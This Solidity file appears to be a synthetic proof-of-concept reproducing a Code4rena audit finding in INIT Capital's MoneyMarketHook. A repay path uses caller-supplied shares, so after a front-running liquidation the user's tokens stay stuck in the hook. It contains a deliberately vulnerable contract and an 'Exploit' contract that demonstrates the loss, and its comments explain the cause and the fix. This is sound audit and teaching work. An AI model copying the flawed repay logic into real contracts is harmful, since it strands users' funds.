// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    INIT Capital — [H-03] MoneyMarketHook#_handleRepay does not consider the
    actual debt shares of the posId and can leave user tokens stuck in the hook
    (code4rena 2023-12-initcapital, reporter said, finding #29591)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    MoneyMarketHook._handleRepay body (debtShareToAmtCurrent on user-provided
    shares + safeTransferFrom of that full amount into the hook) is inlined
    VERBATIM in spirit (marked "@> VULN" below); InitCore._repay's
    min(shares, positionDebtShares) cap is preserved so the surplus remains
    stranded. The Exploit reproduces the finding's liquidator-front-run
    scenario: user schedules a full-debt repay via the hook, a liquidator
    wipes the position's debt first, then the hook pulls the full repayAmt
    and InitCore only consumes 0 — tokens stuck in the hook forever.

    Root cause: `_handleRepay` converts the CALLER-SUPPLIED `_params[i].shares`
    into `repayAmt` and transfers that full amount from the user into the
    hook, without ever reading the position's ACTUAL remaining debt shares
    from PosManager. InitCore._repay later silently caps shares at
    `positionDebtShares` and only pulls the corresponding (smaller) amount
    from the hook into the pool. Any over-pull — especially after a
    front-running liquidation zeros the debt — is permanently stranded in
    the non-withdrawable hook balance.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the lending-pool underlying.
contract MockToken {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal LendingPool: 1:1 debtShare ↔ underlying (interest out of scope).
contract MockLendingPool {
    MockToken public immutable underlying;
    mapping(uint256 => uint256) public posDebtShares; // posId => debt shares (stand-in for PosManager)

    constructor(MockToken _u) {
        underlying = _u;
    }

    function underlyingToken() external view returns (address) {
        return address(underlying);
    }

    function debtShareToAmtCurrent(uint256 _shares) external pure returns (uint256) {
        return _shares; // 1:1
    }

    function setDebtShares(uint256 _posId, uint256 _shares) external {
        posDebtShares[_posId] = _shares;
    }

    function getPosDebtShares(uint256 _posId) external view returns (uint256) {
        return posDebtShares[_posId];
    }

    /// @dev pool receives the underlying; burns the repaid shares.
    function repay(uint256 _shares) external returns (uint256 amt) {
        amt = _shares;
        // tokens already transferred into the pool by InitCore
    }

    /// @dev liquidator path: wipe a position's debt (out of scope for the
    ///      bug itself — only the SIDE EFFECT of zero remaining shares matters).
    function liquidate(uint256 _posId) external {
        posDebtShares[_posId] = 0;
    }
}

/// @notice Reduced InitCore._repay — the REAL consumer of the hook's tokens.
///         Caps shares at the position's actual debt (verbatim logic).
contract InitCoreVuln {
    MockLendingPool public immutable pool;

    constructor(MockLendingPool _pool) {
        pool = _pool;
    }

    /// @notice Verbatim spirit of InitCore.sol#_repay (L530-551):
    ///         sharesToRepay = min(_shares, positionDebtShares);
    ///         transferFrom(msg.sender=hook, pool, amtToRepay).
    function repay(address /*_pool*/, uint256 _shares, uint256 _posId)
        external
        returns (address tokenToRepay, uint256 amt)
    {
        uint256 positionDebtShares = pool.getPosDebtShares(_posId);
        // @audit-info: this silent min() is what leaves surplus stranded in the hook
        uint256 sharesToRepay = _shares < positionDebtShares ? _shares : positionDebtShares;
        uint256 amtToRepay = sharesToRepay; // 1:1 with MockLendingPool
        tokenToRepay = address(pool.underlying());
        if (amtToRepay > 0) {
            MockToken(tokenToRepay).transferFrom(msg.sender, address(pool), amtToRepay);
        }
        pool.setDebtShares(_posId, positionDebtShares - sharesToRepay);
        amt = pool.repay(sharesToRepay);
    }
}

/// @notice Reduced MoneyMarketHook holding ONLY the vulnerable repay path
///         (MoneyMarketHook.sol#_handleRepay L145-159).
contract MoneyMarketHookVuln {
    InitCoreVuln public immutable core;
    MockLendingPool public immutable pool;

    struct RepayParams {
        address pool;
        uint256 shares;
    }

    constructor(InitCoreVuln _core, MockLendingPool _pool) {
        core = _core;
        pool = _pool;
    }

    /// @notice VERBATIM spirit of MoneyMarketHook._handleRepay (L145-159).
    ///         Transfers `debtShareToAmtCurrent(userShares)` FROM the user INTO
    ///         the hook, then calls InitCore.repay with the same user-supplied
    ///         shares — without ever reading the position's actual remaining debt.
    function handleRepay(uint256 _initPosId, RepayParams memory _params) external {
        address uToken = MockLendingPool(_params.pool).underlyingToken();
        // @> VULN: repayAmt is derived solely from the CALLER-SUPPLIED shares —
        // never min()'d against PosManager.getPosDebtShares(_initPosId, pool).
        // The full amount is pulled into THIS hook. InitCore.repay later silently
        // caps at the (possibly much smaller) actual position debt and only
        // transfers THAT smaller amount out of the hook into the pool — any
        // surplus is permanently stuck (no withdraw path on the hook).
        // FIX (per finding): also check provided shares against actual debt
        // shares inside InitCore/PosManager before transferFrom, e.g.
        //   uint actual = IPosManager(POS_MANAGER).getPosDebtShares(_initPosId, _params.pool);
        //   uint shares = _params.shares < actual ? _params.shares : actual;
        //   uint repayAmt = ILendingPool(_params.pool).debtShareToAmtCurrent(shares);
        uint256 repayAmt = MockLendingPool(_params.pool).debtShareToAmtCurrent(_params.shares);
        MockToken(uToken).transferFrom(msg.sender, address(this), repayAmt);
        // hook must approve core (stand-in for _ensureApprove)
        MockToken(uToken).approve(address(core), repayAmt);
        // multicall-reduced: the encoded repay is executed immediately
        core.repay(_params.pool, _params.shares, _initPosId);
    }
}

/// @notice Reproduces the finding: liquidator zeros the position's debt; the
///         user's full-debt repay via the hook still pulls the full amount;
///         InitCore consumes 0 → tokens stuck in the hook.
contract Exploit {
    MockToken public token;
    MockLendingPool public pool;
    InitCoreVuln public core;
    MoneyMarketHookVuln public hook;

    uint256 public constant POS_ID = 1;
    uint256 public constant DEBT_SHARES = 1000e18; // user's full position debt

    constructor() {
        token = new MockToken();
        pool = new MockLendingPool(token);
        core = new InitCoreVuln(pool);
        hook = new MoneyMarketHookVuln(core, pool);
    }

    function run() external {
        // 1. Position has DEBT_SHARES of debt outstanding.
        pool.setDebtShares(POS_ID, DEBT_SHARES);

        // 2. User (this Exploit, acting as the position owner) holds exactly
        //    the tokens needed to repay the FULL debt and approves the hook
        //    (as a normal MoneyMarketHook repay flow). The hook's transferFrom
        //    pulls from msg.sender = address(this).
        token.mint(address(this), DEBT_SHARES);
        token.approve(address(hook), DEBT_SHARES);

        // 3. Liquidator FRONT-RUNS: wipes the position's entire debt. After
        //    this, positionDebtShares == 0, but the user's pending repay still
        //    carries shares = DEBT_SHARES.
        pool.liquidate(POS_ID);
        require(pool.getPosDebtShares(POS_ID) == 0, "liquidation did not zero debt");

        uint256 hookBefore = token.balanceOf(address(hook));
        uint256 userBefore = token.balanceOf(address(this));

        // 4. User's repay executes: hook pulls DEBT_SHARES tokens (based on
        //    user-supplied shares), InitCore caps at 0 actual debt → 0 tokens
        //    leave the hook → full amount stuck.
        MoneyMarketHookVuln.RepayParams memory p =
            MoneyMarketHookVuln.RepayParams({pool: address(pool), shares: DEBT_SHARES});
        hook.handleRepay(POS_ID, p);

        // HARM: the full repay amount is stranded inside the hook; user lost
        // the tokens and has no way to recover them (hook is not withdrawable
        // without an upgrade — per the finding / INIT team's response).
        uint256 stuck = token.balanceOf(address(hook)) - hookBefore;
        require(stuck == DEBT_SHARES, "harm not demonstrated: tokens not stuck in hook");
        require(token.balanceOf(address(this)) == userBefore - DEBT_SHARES, "user did not lose tokens");
        require(pool.getPosDebtShares(POS_ID) == 0, "debt should remain zero");
    }
}
